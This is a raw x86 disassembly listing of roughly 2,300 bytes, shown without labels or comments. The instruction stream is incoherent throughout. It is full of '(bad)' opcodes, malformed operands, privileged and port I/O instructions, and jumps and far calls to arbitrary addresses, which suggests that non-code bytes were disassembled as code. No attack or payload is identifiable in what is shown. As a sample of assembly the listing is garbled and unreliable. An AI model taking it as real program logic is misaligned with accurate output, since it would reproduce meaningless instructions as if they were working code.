  407f2c:	xor    eax,0xeee904
  407f31:	add    BYTE PTR [eax],al
  407f33:	out    0xe1,al
  407f35:	daa    
  407f36:	inc    ecx
  407f37:	mov    ?,WORD PTR [edx-0x34e9f38c]
  407f3d:	mov    bl,0xff
  407f3f:	sbb    DWORD PTR [ecx-0x3b342f76],edx
  407f45:	repz imul DWORD PTR [ecx]
  407f48:	mov    edx,0x3b36524f
  407f4d:	mov    bl,0xff
  407f4f:	fxch   st(0)
  407f51:	test   al,dh
  407f53:	sar    DWORD PTR [edx+0x7182e8fe],1
  407f59:	(bad)  
  407f5a:	dec    ebx
  407f5c:	(bad)  
  407f5d:	xlat   BYTE PTR ds:[ebx]
  407f5e:	neg    ecx
  407f60:	mov    edx,0xf986684f
  407f65:	inc    eax
  407f66:	add    BYTE PTR [ecx+0x74],ch
  407f69:	lock neg ecx
  407f6c:	mov    edx,0xe84e35fe
  407f71:	inc    eax
  407f72:	add    BYTE PTR [esi+0xa],ah
  407f75:	mov    bl,0xff
  407f77:	leave  
  407f78:	enter  0xe484,0x0
	...
  407f90:	xchg   ecx,eax
  407f91:	mov    edx,0x5ba76afe
  407f96:	(bad)  [ebp-0xfc6551]
  407f9c:	sbb    cl,BYTE PTR [ebx+0x4f]
  407f9f:	(bad)  
  407fa0:	fadd   DWORD PTR [ebx+0xd]
  407fa3:	jo     0x408023
  407fa5:	call   0xff48:0x816e803
  407fac:	cs (bad) 
  407fae:	push   edi
  407faf:	idiv   DWORD PTR [eax+0x48ffda23]
  407fb5:	ins    BYTE PTR es:[edi],dx
  407fb6:	or     al,0x41
  407fb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fb9:	xor    al,0x91
  407fbb:	lock cwde 
  407fbd:	cmp    eax,0x9d2ff47
  407fc2:	sbb    eax,0x7341a741
  407fc7:	mov    bl,0x88
  407fc9:	xchg   ebp,eax
  407fca:	jge    0x407f51
  407fcc:	(bad)  
  407fcd:	gs inc edi
  407fcf:	jmp    FWORD PTR [edx]
  407fd1:	fbld   TBYTE PTR [edi]
  407fd3:	div    DWORD PTR [eax+0x6d]
  407fd6:	mov    ah,0x67
  407fd8:	push   esi
  407fd9:	xor    al,ah
  407fdb:	jmp    DWORD PTR [ecx+0x7]
  407fde:	push   esp
  407fdf:	neg    DWORD PTR [eax-0x3b]
  407fe2:	inc    esi
  407fe3:	xor    eax,0xffc442d7
  407fe8:	inc    eax
  407fe9:	dec    edx
  407fea:	xchg   edx,eax
  407feb:	inc    DWORD PTR [eax+0x51]
  407fee:	inc    ebx
  407fef:	je     0x407f8f
  407ff1:	fmul   DWORD PTR [eax+0xdc]
	...
  408007:	add    BYTE PTR [eax],al
  408009:	cmp    BYTE PTR [ebp+0x49b20446],ch
  40800f:	inc    esi
  408010:	xor    BYTE PTR [eax],dh
  408012:	xlat   BYTE PTR ds:[ebx]
  408013:	arpl   di,si
  408015:	sbb    BYTE PTR ds:0xc9d2e7b4,al
  40801b:	inc    esi
  40801c:	(bad)  
  40801d:	cld    
  40801e:	sub    eax,0x27bbffa
  408023:	out    dx,eax
  408024:	mov    bl,0x0
  408026:	adc    bl,BYTE PTR [ecx+0x47]
  408029:	lock cmp ebp,DWORD PTR [esp+eiz*2-0x10]
  40802e:	inc    ebx
  40802f:	push   cs
  408030:	icebp  
  408031:	loopne 0x408076
  408033:	jmp    0xf69f9aba
  408038:	inc    esi
  408039:	rol    BYTE PTR [edx],1
  40803b:	jge    0x408002
  40803d:	and    eax,0xc04efd86
  408042:	inc    ebx
  408043:	jmp    0x9cbfb417
  408048:	pop    ebx
  408049:	mov    eax,0x3303d643
  40804e:	(bad)  
  40804f:	inc    edx
  408050:	add    al,0x32
  408052:	jge    0x407ff5
  408054:	dec    esi
  408055:	cwde   
  408056:	inc    ebx
  408057:	sbb    DWORD PTR [edi+0x5a],eax
  40805a:	pop    esi
  40805b:	mov    esi,0x1b5a8846
  408060:	xor    DWORD PTR [eax-0xcbc0dbd],eax
  408066:	scas   al,BYTE PTR es:[edi]
  408067:	imul   ecx,DWORD PTR [eax+0x46964b4f],0x0
	...
  408081:	add    BYTE PTR [edi+0x60dc21ce],ah
  408087:	inc    ebx
  408088:	xchg   esi,eax
  408089:	test   DWORD PTR [eax-0x33],ebx
  40808c:	lock pop ebx
  40808e:	enter  0x7696,0x46
  408092:	dec    eax
  408093:	lea    edi,[ebp+0x4e]
  408096:	inc    eax
  408097:	inc    ebx
  408098:	data16 shl BYTE PTR [eax+0x3097a25a],1
  40809f:	inc    ebx
  4080a0:	push   esi
  4080a1:	nop
  4080a2:	aas    
  4080a3:	dec    ebx
  4080a4:	dec    esi
  4080a5:	inc    esi
  4080a6:	and    ch,cl
  4080a8:	lock pop ebx
  4080aa:	dec    edx
  4080ab:	xchg   esi,eax
  4080ac:	ds inc esi
  4080ae:	adc    BYTE PTR [ebp+0x43591100],cl
  4080b4:	jmp    FWORD PTR [esi]
  4080b6:	pop    ss
  4080b7:	pop    esi
  4080b8:	mul    DWORD PTR [esi]
  4080ba:	popa   
  4080bb:	inc    ebx
  4080bc:	jne    0x4080af
  4080be:	dec    esp
  4080bf:	aad    0xab
  4080c1:	push   ss
  4080c2:	popa   
  4080c3:	inc    ebx
  4080c4:	mov    ch,0x9
  4080c6:	jno    0x40810b
  4080c8:	inc    DWORD PTR [esi]
  4080ca:	idiv   edx
  4080cc:	out    0xd0,eax
  4080ce:	cmp    BYTE PTR [ebx-0x1],al
  4080d1:	neg    BYTE PTR [eax]
  4080d3:	pop    esi
  4080d4:	imul   esi
  4080d6:	push   0x5a
  4080d8:	xchg   ebp,eax
  4080d9:	xchg   esi,eax
  4080da:	bound  eax,QWORD PTR [ebx-0x1]
  4080dd:	xchg   esp,eax
  4080de:	dec    edi
  4080df:	dec    ebx
  4080e0:	call   esi
  4080e2:	dec    ebx
  4080e3:	js     0x408094
  4080e5:	into   
	...
  4080fa:	add    dl,ch
  4080fc:	inc    ecx
  4080fd:	mov    ch,0xd1
  4080ff:	jmp    0xff71:0x6ad1ff41
  408106:	mov    dh,0xe2
  408108:	ja     0x4080fa
  40810a:	mov    dh,0xea
  40810c:	inc    ecx
  40810d:	call   0xff82932f
  408112:	sahf   
  408113:	xor    BYTE PTR [edx],bh
  408115:	jmp    0xff826245
  40811a:	mov    ?,WORD PTR [eax+0x3e]
  40811d:	call   0x43a569
  408122:	mov    al,0xe5
  408124:	or     al,BYTE PTR [eax]
  408126:	sbb    al,0xce
  408128:	and    DWORD PTR cs:[ebp-0xa8abe29],0xffffffdc
  408130:	fdivr  DWORD PTR [edi-0x17]
  408133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408134:	mov    eax,DWORD PTR [ebp+0x51]
  408137:	loop   0x4080f0
  408139:	test   DWORD PTR [ecx+0x49],0x6100ff71
  408140:	mov    ebp,0x51d1fc44
  408145:	sti    
  408146:	dec    DWORD PTR [ebx-0x32]
  408149:	(bad)  
  40814a:	jne    0x40812e
  40814c:	fst    QWORD PTR [esi]
  40814e:	mov    ebx,0xc00ac7c1
  408153:	sbb    cl,BYTE PTR [eax]
  408155:	mov    DWORD PTR [ebp-0x76],eax
  408158:	pop    esp
  408159:	dec    DWORD PTR [ebx+ecx*1+0xff4fd2]
	...
  408174:	pop    ebx
  408175:	leave  
  408176:	out    0x7b,eax
  408178:	mov    edx,0x7e0bfec7
  40817d:	push   edx
  40817e:	sub    BYTE PTR [eax-0x32],ch
  408181:	xor    eax,0x50c1beee
  408186:	pop    es
  408187:	call   0x401cb3
  40818c:	rcl    DWORD PTR [eax-0x9],1
  40818f:	(bad)  
  408190:	sti    
  408191:	cmp    bh,dh
  408193:	jne    0x40812b
  408195:	ffree  st(0)
  408197:	stos   DWORD PTR es:[edi],eax
  408198:	push   ecx
  408199:	(bad)  
  40819a:	(bad)  
  40819b:	jne    0x4081e7
  40819d:	(bad)  
  40819e:	je     0x40819c
  4081a0:	push   ecx
  4081a1:	push   eax
  4081a2:	pop    es
  4081a3:	call   0x401c85
  4081a8:	adc    DWORD PTR [eax-0x5],edx
  4081ab:	call   0x4018d2
  4081b0:	pop    es
  4081b1:	ret    
  4081b2:	pop    es
  4081b3:	add    BYTE PTR [ebx+0xa83ebbb],bh
  4081b9:	fst    QWORD PTR [ebp-0x1]
  4081bc:	dec    ebx
  4081bd:	cmp    edi,esp
  4081bf:	lods   eax,DWORD PTR ds:[esi]
  4081c0:	jge    0x408188
  4081c2:	dec    BYTE PTR [ebx]
  4081c4:	mov    ss,WORD PTR [eax+0x4]
  4081c7:	pop    esi
  4081c8:	ja     0x40818d
  4081ca:	pop    es
  4081cb:	add    BYTE PTR [edi+0x77efbda6],ah
  4081d1:	ror    ch,1
  4081d3:	or     ecx,DWORD PTR [edi]
  4081d5:	push   0xff8f
	...
  4081ea:	add    BYTE PTR [eax],al
  4081ec:	add    BYTE PTR [eax],dl
  4081ee:	xor    al,0x43
  4081f0:	mov    db2,ebp
  4081f3:	add    al,BYTE PTR [eax]
  4081f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081f6:	lock int 0xfb
  4081f9:	pmuludq mm2,QWORD PTR [edi+edi*8-0x14424e10]
  408201:	call   0x5b3fc9a3
  408206:	aas    
  408207:	inc    ebx
  408208:	jne    0x4081e9
  40820a:	adc    dl,BYTE PTR [edx-0x52]
  40820d:	sar    BYTE PTR [edi],1
  40820f:	ja     0x408286
  408211:	mov    ebx,0xad67ba03
  408216:	jb     0x4081da
  408218:	call   DWORD PTR [edx+0x53]
  40821b:	lds    eax,FWORD PTR [eax-0x3ff1d459]
  408221:	xor    ch,BYTE PTR ds:0x5a2c3d2e
  408227:	lods   al,BYTE PTR ds:[esi]
  408228:	or     esi,ebx
  40822a:	jmp    0x4:0x12ae803
  408231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408232:	jns    0x4081c1
  408234:	jne    0x4081c5
  408236:	ret    0x391c
  408239:	out    0x29,al
  40823b:	(bad)  
  40823d:	nop
  40823e:	stos   BYTE PTR es:[edi],al
  40823f:	add    eax,DWORD PTR [eax]
  408241:	pushf  
  408242:	imul   edi,DWORD PTR [ecx-0x72cab3ff],0x32a6110
  40824c:	push   eax
  40824d:	cmc    
  40824e:	sar    BYTE PTR [eax+0xe7],0x0
	...
  408265:	add    BYTE PTR [eax+0x3f],cl
  408268:	or     ebp,eax
  40826a:	ds mov al,0x42
  40826d:	(bad)  
  40826e:	fld    QWORD PTR [edx]
  408270:	ror    DWORD PTR [ebx+0x41f8297],0xb2
  408277:	je     0x40823a
  408279:	add    al,0xb7
  40827b:	das    
  40827c:	pop    DWORD PTR [ebx-0x6e]
  40827f:	or     dl,BYTE PTR [ecx+0x50]
  408282:	cmp    eax,0x92433e40
  408287:	ds ss mov ecx,0xbb4400c
  40828e:	getsec 
  408290:	push   ebx
  408291:	inc    ebx
  408292:	lock aas 
  408294:	xchg   esp,eax
  408295:	das    
  408296:	(bad)  
  408297:	in     eax,dx
  408298:	inc    esi
  408299:	inc    ebx
  40829a:	loopne 0x408229
  40829c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40829d:	xor    esi,DWORD PTR [edi+0x2a]
  4082a0:	call   0x6904:0x123fd077
  4082a7:	dec    ecx
  4082a8:	sub    ecx,DWORD PTR [edi+eiz*4]
  4082ab:	aad    0x61
  4082ad:	xor    BYTE PTR [edi+eax*2],ah
  4082b0:	in     eax,0xad
  4082b2:	mov    al,0xa9
  4082b4:	repz inc edx
  4082b6:	xor    cl,BYTE PTR [edx]
  4082b8:	rol    esi,0x4d
  4082bb:	aas    
  4082bc:	into   
  4082bd:	mov    edx,fs
  4082bf:	ds push ecx
  4082c1:	pop    edx
  4082c2:	iret   
  4082c3:	shr    eax,0x42
  4082c6:	adc    cl,BYTE PTR [ebx]
  4082c8:	shr    DWORD PTR [edx+0x0],0x0
	...
  4082dc:	add    BYTE PTR [eax],al
  4082de:	add    BYTE PTR [ebx+0x78adae3f],al
  4082e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082e5:	fdivr  st,st(4)
  4082e7:	out    0x2,eax
  4082e9:	adc    DWORD PTR [eax],esp
  4082eb:	scas   al,BYTE PTR es:[edi]
  4082ec:	shr    eax,0x42
  4082ef:	call   0x8527:0x58c4bfb2
  4082f6:	jae    0x408348
  4082f8:	aas    
  4082f9:	repnz inc ebx
  4082fb:	rcr    DWORD PTR [eax+eax*1],cl
  4082fe:	add    esp,esp
  408300:	cli    
  408301:	inc    eax
  408302:	jmp    0x9908aa5b
  408307:	in     eax,0x3f
  408309:	push   eax
  40830a:	mov    ecx,0x4107b5e5
  40830f:	leave  
  408310:	inc    eax
  408311:	dec    DWORD PTR [esi-0x34]
  408314:	dec    eax
  408315:	lods   eax,DWORD PTR ds:[esi]
  408316:	inc    esi
  408317:	lods   al,BYTE PTR gs:[esi]
  408319:	sbb    DWORD PTR [ecx-0x4a],edx
  40831c:	je     0x40831d
  40831e:	ss mov cl,0x42
  408321:	je     0x408327
  408323:	dec    ebx
  408324:	xor    al,0x38
  408326:	test   al,0xa4
  408328:	shl    bh,cl
  40832a:	dec    edx
  40832b:	jae    0x40836c
  40832d:	inc    DWORD PTR [ecx-0x16bf059b]
  408333:	hlt    
  408334:	es cwde 
  408336:	cmp    BYTE PTR [ebp+0x3f],ah
  408339:	push   eax
  40833a:	cdq    
  40833b:	gs mov ch,0x7
  40833e:	add    DWORD PTR [ecx],edi
  408340:	inc    eax
  408341:	(bad)  
  408342:	out    dx,al
	...
  408357:	add    BYTE PTR [ebp+0x66e6ad98],cl
  40835d:	lods   al,BYTE PTR ds:[esi]
  40835e:	sbb    edx,ecx
  408360:	inc    ebp
  408361:	jno    0x408362
  408363:	(bad)  
  408364:	mov    dl,0x42
  408366:	je     0x40836c
  408368:	dec    ebx
  408369:	xor    DWORD PTR [eax],edi
  40836b:	sub    BYTE PTR [ebx+0x143ae7d2],ch
  408371:	inc    DWORD PTR ds:[ecx-0x1a]
  408375:	cli    
  408376:	inc    eax
  408377:	jmp    0x58a8a9d0
  40837c:	out    0x3d,al
  40837e:	push   eax
  40837f:	cmp    esi,esp
  408381:	mov    bh,0x7
  408383:	sub    DWORD PTR [edx],0x8b8eff3d
  408389:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40838a:	lods   al,BYTE PTR ds:[esi]
  40838b:	add    BYTE PTR [ecx],ch
  40838d:	les    ebp,FWORD PTR [ecx+0x23]
  408390:	ss mov cl,0xb0
  408393:	(bad)  
  408394:	mov    ecx,0x6374c00f
  408399:	push   0xfffffff2
  40839b:	cmp    bh,bh
  40839d:	add    DWORD PTR [eax-0x18],edx
  4083a0:	std    
  4083a1:	mov    al,0xfe
  4083a3:	jmp    esi
  4083a5:	ret    0x4137
  4083a8:	push   cs
  4083a9:	push   edx
  4083aa:	out    0x38,eax
  4083ac:	pop    ebx
  4083ae:	(bad)  
  4083af:	push   eax
  4083b0:	cs ret 
  4083b2:	je     0x4083bc
  4083b4:	push   di
  4083b6:	std    
  4083b7:	dec    ecx
  4083b9:	out    dx,al
  4083ba:	xor    eax,0xad
	...
  4083cf:	add    BYTE PTR [eax],al
  4083d1:	leave  
  4083d2:	ret    
  4083d3:	(bad)  
  4083d4:	jne    0x408360
  4083d6:	ret    
  4083d7:	je     0x4083e1
  4083d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083da:	test   eax,0xc9a9ffa9
  4083df:	rol    DWORD PTR [esi+edi*4],0x54
  4083e3:	mov    ch,ah
  4083e5:	aas    
  4083e6:	retf   0xf7db
  4083e9:	mov    ecx,0xca458cc2
  4083ee:	push   ecx
  4083ef:	(bad)  
  4083f0:	jne    0x4083a0
  4083f2:	ret    0xc74
  4083f5:	(bad)  
  4083f6:	jb     0x408476
  4083f8:	add    BYTE PTR [esi+0x30fc00e],cl
  4083fe:	test   BYTE PTR [ecx],al
  408400:	add    BYTE PTR [esi-0x36],bh
  408403:	inc    esp
  408404:	clc    
  408405:	jle    0x408408
  408407:	add    BYTE PTR [eax],al
  408409:	push   ecx
  40840a:	inc    esp
  40840b:	repz inc DWORD PTR [ecx+0x7e6a0001]
  408412:	outs   dx,DWORD PTR ds:[esi]
  408413:	jmp    FWORD PTR [ecx+0x7e]
  408416:	outs   dx,DWORD PTR ds:[esi]
  408417:	dec    DWORD PTR [edi+eiz*4+0x2a5037ee]
  40841e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40841f:	not    DWORD PTR ss:[eax-0x7c]
  408423:	sar    esi,cl
  408425:	rol    BYTE PTR [ebx-0x7cbc8ac0],cl
  40842b:	ret    0xa77e
  40842e:	sub    ecx,DWORD PTR [eax+eax*8]
  408431:	mov    ebx,0x812a2e
	...
  40844a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40844b:	sub    eax,DWORD PTR [ebx]
  40844d:	push   0xffc30306
  408452:	sbb    DWORD PTR [esi+0x13],edx
  408455:	call   0xff803fe5
  40845a:	ja     0x40840c
  40845c:	push   edx
  40845d:	lea    ebp,[edx]
  40845f:	push   DWORD PTR [edi]
  408461:	(bad)  
  408462:	clc    
  408463:	call   0xff3f:0xdb5be7d5
  40846a:	push   ds
  40846b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40846c:	xor    dh,bh
  40846e:	loopne 0x408483
  408470:	sub    ebp,DWORD PTR [edx+0x6a400c0b]
  408476:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408477:	xchg   ebx,eax
  408478:	sar    DWORD PTR [eax],cl
  40847a:	sub    ax,WORD PTR [eax-0x4b]
  40847e:	mov    bh,0x3b
  408480:	aas    
  408481:	(bad)  
  408482:	mov    eax,0x2e80eb5
  408487:	xchg   esp,eax
  408488:	aas    
  408489:	call   FWORD PTR [esi]
  40848b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40848c:	daa    
  40848d:	mul    DWORD PTR [eax+0xffaa55]
  408493:	repz cld 
  408495:	inc    eax
  408496:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408497:	inc    esp
  408498:	jns    0x40848a
  40849a:	nop
  40849b:	jge    0x4084dc
  40849d:	(bad)  
  40849e:	cli    
  40849f:	and    eax,0x6d48922b
  4084a4:	aas    
  4084a5:	mov    DWORD PTR [edx],ebp
  4084a7:	add    ecx,DWORD PTR [ecx+0x133c6837]
  4084ad:	add    al,0x0
	...
  4084c3:	iret   
  4084c4:	ret    0xc4cf
  4084c7:	pop    eax
  4084c8:	cmp    eax,0x3c583454
  4084cd:	xchg   BYTE PTR [edi],bh
  4084cf:	ror    BYTE PTR [esi],cl
  4084d1:	xchg   ecx,eax
  4084d2:	mov    bh,0x11
  4084d4:	cmp    al,0x76
  4084d6:	lea    esp,[edx]
  4084d8:	das    
  4084d9:	jbe    0x40851a
  4084db:	xor    BYTE PTR [ecx-0x61e5418],ch
  4084e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084e2:	add    esp,DWORD PTR [eax]
  4084e4:	jbe    0x40853f
  4084e6:	aaa    
  4084e7:	sbb    BYTE PTR [esi+ecx*2],bh
  4084ea:	mov    ecx,0x6ea52a9c
  4084ef:	or     BYTE PTR [eax+esi*2],bh
  4084f2:	mov    DWORD PTR [edi],ecx
  4084f4:	xor    al,0x36
  4084f6:	aas    
  4084f7:	lea    eax,[edx]
  4084f9:	shl    DWORD PTR [edx+0x3ee8c1af],0x32
  408500:	xor    edx,DWORD PTR [esi]
  408502:	aas    
  408503:	loopne 0x408540
  408505:	pushf  
  408506:	bswap  edi
  408508:	sar    DWORD PTR ds:0x6c89d03f,0x60
  40850f:	sar    BYTE PTR [ebx],1
  408511:	inc    BYTE PTR [edx+0x3efe2702]
  408517:	mov    eax,0x240c7402
  40851c:	jle    0x4084e7
  40851e:	ss test al,0x3b
  408521:	jmp    0x94c090dd
  408526:	das    
	...
  40853b:	add    BYTE PTR [eax+0x1b03ce3b],dl
  408541:	fild   QWORD PTR [ecx-0x80]
  408544:	jg     0x408579
  408546:	mov    esi,0xffb6a73e
  40854b:	sbb    DWORD PTR [ebx+0x3b],ecx
  40854e:	(bad)  
  40854f:	mov    esi,0xf1753bf2
  408554:	mov    esp,0xa19ea7b7
  408559:	cmp    esi,DWORD PTR [ebp-0xc46e7b]
  40855f:	mov    cs,WORD PTR [edi]
  408561:	add    ebp,eax
  408563:	mov    dh,0xbc
  408565:	cmp    edi,edi
  408567:	jle    0x408528
  408569:	sub    dh,bh
  40856b:	jbe    0x4085e6
  40856d:	cmp    esi,DWORD PTR [ebp-0x1f]
  408570:	jl     0x4085b3
  408572:	test   al,0x66
  408574:	imul   edi,DWORD PTR [ebx],0x3bd945b5
  40857a:	call   DWORD PTR [esi+0x5f]
  40857d:	add    ebp,eax
  40857f:	call   0x228f:0x46ff3b7c
  408586:	idiv   DWORD PTR [esi]
  408588:	sar    DWORD PTR [ebx],0x75
  40858b:	loope  0x408559
  40858d:	gs test al,0x2e
  408590:	mov    cl,0x3b
  408592:	mov    ch,0x45
  408594:	mov    cl,0x3b
  408596:	call   FWORD PTR [esi]
  408598:	pop    ds
  408599:	add    ebp,eax
  40859b:	jle    0x4085e9
  40859d:	cmp    edi,edi
  40859f:	push   cs
	...
  4085b4:	add    BYTE PTR [edi+0x26],cl
  4085b7:	test   DWORD PTR [esi],0x52a12a89
  4085bd:	cmp    DWORD PTR [ebx],0x33843cff
  4085c3:	(bad)  
  4085c4:	out    dx,al
  4085c5:	jge    0x40855b
  4085c7:	stos   DWORD PTR es:[edi],eax
  4085c8:	out    0x6a,al
  4085ca:	cmp    esi,DWORD PTR [ebp-0xc62533]
  4085d0:	shr    DWORD PTR [esi],0x6e
  4085d3:	dec    esi
  4085d5:	shr    BYTE PTR [edi-0x18],cl
  4085d8:	add    BYTE PTR [ecx-0x8],cl
  4085db:	(bad)  
  4085dc:	call   0x3f31ef
  4085e1:	xor    DWORD PTR [edx-0x7be0825],esi
  4085e7:	out    0x75,eax
  4085e9:	aad    0xf7
  4085eb:	(bad)  
  4085ec:	(bad)  
  4085ed:	sti    
  4085ee:	out    dx,al
  4085ef:	idiv   bh
  4085f1:	xor    eax,edi
  4085f3:	je     0x408601
  4085f5:	and    DWORD PTR [edx+0x7],esi
  4085f8:	call   0x3f7e60
  4085fd:	shl    DWORD PTR [ecx-0x84e0811],0xe7
  408604:	pop    ecx
  408605:	in     eax,0xf7
  408607:	(bad)  
  408608:	(bad)  
  408609:	sti    
  40860a:	std    
  40860b:	call   0xff380661
  408610:	(bad)  
  408611:	sti    
  408612:	stc    
  408613:	out    0xa3,eax
  408615:	jecxz  0x40861c
  408617:	add    cl,cl
	...
  40862d:	add    BYTE PTR [edx+edx*1-0xd8aab00],bh
  408634:	add    ah,0xb2
  408637:	ins    BYTE PTR es:[edi],dx
  408638:	jmp    FWORD PTR [ecx-0x28]
  40863b:	div    BYTE PTR [eax+ecx*1-0x6a]
  40863f:	imul   esp,DWORD PTR [edi+0x458dc1ff],0xfffffffc
  408646:	imul   edi,DWORD PTR es:[eax],0x16dbe41
  40864d:	add    BYTE PTR [esi-0x498a007b],bh
  408653:	in     eax,dx
  408654:	idiv   ch
  408656:	mov    cl,0xf6
  408658:	ins    DWORD PTR es:[di],dx
  40865a:	test   DWORD PTR [edi+edi*8-0x2],0x41286e8b
  408662:	mov    ?,esi
  408664:	je     0x40866e
  408666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408667:	inc    ebx
  408668:	daa    
  408669:	std    
  40866a:	nop
  40866b:	dec    eax
  40866c:	cmp    al,0x75
  40866e:	mov    eax,DWORD PTR [eax-0x4a]
  408671:	pop    es
  408672:	(bad)  
  408673:	stc    
  408674:	imul   edi,edi,0x78
  408677:	bound  eax,QWORD PTR [ecx+0x4]
  40867a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40867b:	push   cs
  40867c:	mov    esp,ebp
  40867e:	es addr16 pop edi
  408681:	mul    DWORD PTR [eax-0x68]
  408684:	mov    es,WORD PTR [ebp+0x5b]
  408687:	sti    
  408688:	cmp    al,0x75
  40868a:	mov    bh,0x88
  40868c:	mov    dh,0xb
  40868e:	aas    
  40868f:	out    0xbe,eax
  408691:	inc    DWORD PTR [eax]
	...
  4086a7:	inc    eax
  4086a8:	xor    al,0x43
  4086aa:	mov    cr6,ecx
  4086ad:	add    DWORD PTR [eax],eax
  4086af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086b0:	pusha  
  4086b1:	(bad)  
  4086b2:	mul    DWORD PTR [edi-0x17fffcd5]
  4086b8:	pop    ebp
  4086b9:	aaa    
  4086ba:	jmp    DWORD PTR [eax-0x5895fcd5]
  4086c0:	inc    ebp
  4086c1:	add    ebp,DWORD PTR [edx-0x59]
  4086c4:	push   ebp
  4086c5:	add    ecx,DWORD PTR [ebp-0x732d1096]
  4086cb:	and    dh,bh
  4086cd:	xor    edi,edi
  4086cf:	lock call 0xfbb5:0xdfef753c
  4086d7:	iret   
  4086d8:	xor    BYTE PTR [esi+0x4323d8ff],bh
  4086de:	je     0x40868a
  4086e0:	add    al,BYTE PTR [edx-0x54d458ff]
  4086e6:	loopne 0x408677
  4086e8:	push   0x3
  4086ea:	push   DWORD PTR [edx]
  4086ec:	pop    ebx
  4086ed:	sub    edi,DWORD PTR [ecx]
  4086ef:	add    DWORD PTR [eax],ebp
  4086f1:	cmp    edx,DWORD PTR [eax+0x1c]
  4086f4:	add    bh,BYTE PTR [ecx-0x29d0d577]
  4086fa:	cmp    ebx,DWORD PTR [eax-0x41d3c52d]
  408700:	push   0x7e1e3bce
  408705:	mov    ecx,0xd1388033
  40870a:	mov    ebx,0x0
	...
  40871f:	add    BYTE PTR [esi+0x38],cl
  408722:	mov    dh,0xae
  408724:	jo     0x4086c6
  408726:	js     0x408725
  408728:	out    0x2,eax
  40872a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40872b:	jno    0x408784
  40872d:	xor    BYTE PTR [esi-0x1b51a7c5],bl
  408733:	sub    esp,DWORD PTR ds:0x1e3b8e66
  408739:	jle    0x4086c8
  40873b:	xor    eax,DWORD PTR [eax+0x38]
  40873e:	adc    eax,DWORD PTR [edi+ecx*8]
  408741:	jbe    0x4086f3
  408743:	les    esi,FWORD PTR [eax]
  408745:	cmp    DWORD PTR [esp+esi*1],esi
  408748:	xor    BYTE PTR [eax],bh
  40874a:	cmp    bx,WORD PTR [edx+0x4ba35106]
  408751:	cmp    BYTE PTR [esi-0x73],dl
  408754:	sub    ah,BYTE PTR [ebx]
  408756:	push   esi
  408757:	cmp    ecx,DWORD PTR [eax]
  408759:	lods   eax,DWORD PTR ds:[esi]
  40875a:	call   0xa83aa60a
  40875f:	add    edi,eax
  408761:	ins    DWORD PTR es:[edi],dx
  408762:	cmp    DWORD PTR [ebx],esi
  408764:	lock aaa 
  408766:	cs mov cl,0x9c
  408769:	sub    dh,BYTE PTR [ebp+0x7037e068]
  40876f:	or     ebx,0x3d3b162f
  408775:	add    al,BYTE PTR [ecx-0x173e71a1]
  40877b:	cmp    bh,dl
  40877d:	xor    dh,dh
  40877f:	cmp    bh,BYTE PTR [eax+0x7c0037]
	...
  408799:	test   al,0x2a
  40879b:	xor    DWORD PTR [esp+ebp*2],edi
  40879e:	aaa    
  40879f:	mov    DWORD PTR [esp+ecx*8+0x2f],ebp
  4087a3:	(bad)  
  4087a4:	fimul  WORD PTR [edx+0x37]
  4087a7:	addr16 mov al,ds:0xc293
  4087ab:	dec    ebp
  4087ad:	pop    ss
  4087ae:	xor    esi,edi
  4087b0:	(bad)  
  4087b1:	mov    ebp,0xcced7537
  4087b6:	adc    BYTE PTR [ebp-0x7a76524a],ch
  4087bc:	lea    esi,[ebp-0x209500c9]
  4087c2:	push   ds
  4087c3:	neg    DWORD PTR [esi-0x1f8afd63]
  4087c9:	sub    DWORD PTR [ebp-0x20],esi
  4087cc:	xchg   esi,eax
  4087cd:	lea    esi,[edi]
  4087cf:	add    ch,bh
  4087d1:	pop    es
  4087d2:	test   BYTE PTR [ebp-0xc88a73],bh
  4087d8:	jmp    0x2cc362dd
  4087dd:	jl     0x40880e
  4087df:	jmp    DWORD PTR [esi-0x5c]
  4087e2:	scas   al,BYTE PTR es:[edi]
  4087e3:	push   edx
  4087e4:	shl    DWORD PTR [edx+eax*1-0x52326811],1
  4087eb:	pop    es
  4087ec:	inc    ecx
  4087ed:	hlt    
  4087ee:	pop    esp
  4087ef:	inc    DWORD PTR [esi-0x43]
  4087f2:	ins    DWORD PTR es:[edi],dx
  4087f3:	in     al,dx
  4087f4:	ss mov ebp,0x9cbcff37
  4087fa:	sub    ah,BYTE PTR [edi+eax*4+0x0]
	...
  408811:	add    BYTE PTR [ebp-0x73a300c9],ch
  408817:	das    
  408818:	call   FWORD PTR [esi]
  40881a:	popf   
  40881b:	lods   eax,DWORD PTR ds:[esi]
  40881c:	pop    es
  40881d:	add    DWORD PTR [esi],esi
  40881f:	pusha  
  408820:	dec    DWORD PTR [esi]
  408822:	lea    ebp,[ebp-0x1c]
  408825:	add    cl,al
  408827:	clc    
  408828:	(bad)  
  408829:	push   DWORD PTR [ebx]
  40882b:	or     ebp,eax
  40882d:	mov    BYTE PTR [eax-0x4],ah
  408830:	(bad)  
  408831:	push   DWORD PTR [ebx-0x1d]
  408834:	idiv   bh
  408836:	mov    esp,edi
  408838:	je     0x408842
  40883a:	jbe    0x4088b1
  40883c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40883d:	(bad)  
  40883e:	jns    0x40883c
  408840:	mov    ah,0xdc
  408842:	jno    0x408840
  408844:	(bad)  
